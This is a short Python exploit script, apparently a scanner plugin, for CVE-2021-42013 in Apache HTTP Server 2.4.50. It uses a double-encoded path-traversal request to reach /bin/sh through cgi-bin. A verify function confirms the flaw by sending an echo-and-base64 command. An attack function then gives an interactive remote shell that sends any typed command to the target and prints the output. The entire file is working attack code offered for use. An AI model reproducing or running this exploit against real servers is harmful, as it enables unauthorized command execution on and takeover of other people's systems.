import requests
import re
import urllib
from urllib import request
import time
import socket
from urllib.parse import urlparse

def verify(url):
    relsult = {
        'name': ' Apache HTTP Server 2.4.50 远程代码执行漏洞（CVE-2021-42013）',
        'vulnerable': False,
        'attack': True,
    }

    cmd = 'echo 9304c2d1af7a21f56830c7ba773a93e2 | base64'

    # 防止ssl报错
    p = b'''
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1
Host: localhost:8080
Accept-Encoding: identity
Content-Type: application/text
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36
Content-Length: 51

'''.replace(b'\n', b'\r\n')
    payload = 'echo;{0}\n'.format(cmd)
    payload = bytes(payload, 'utf-8')
    payload = payload.replace(b'\n', b'\r\n')

    try:
        oH = urlparse(url)
        a = oH.netloc.split(':')
        port = 80
        if 2 == len(a):
            port = a[1]
        elif 'https' in oH.scheme:
            port = 443
        host = a[0]
        with socket.create_connection((host, port), timeout=5) as conn:
            conn.send(p + payload)
            time.sleep(2)
            rep = conn.recv(10240).decode()
        if re.search("OTMwNGMyZDFhZjdhMjFmNTY4MzBjN2JhNzczYTkzZTIK", rep):
            relsult['vulnerable'] = True
            relsult['url'] = url
            relsult['about'] = 'https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013'
            return relsult
        else:
            return relsult
    except:
        return relsult

def attack(url):
    try:
        payload = '/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'
        vurl = urllib.parse.urljoin(url, payload)
        post_data = 'echo;{0}'
        cmd = ''
        print('[+] 开始执行命令, 输入exit退出!')
        while cmd != 'exit':
            post_data = 'echo;{0}'
            cmd = str(input('[+] 执行命令:'))
            post_data = bytes(post_data.format(cmd), 'utf-8')
            with request.urlopen(vurl, data=post_data) as response:
                data = response.read()
                print('[*] 执行结果:')
                print(data.decode('utf-8'))
        return True
    except:
        return False


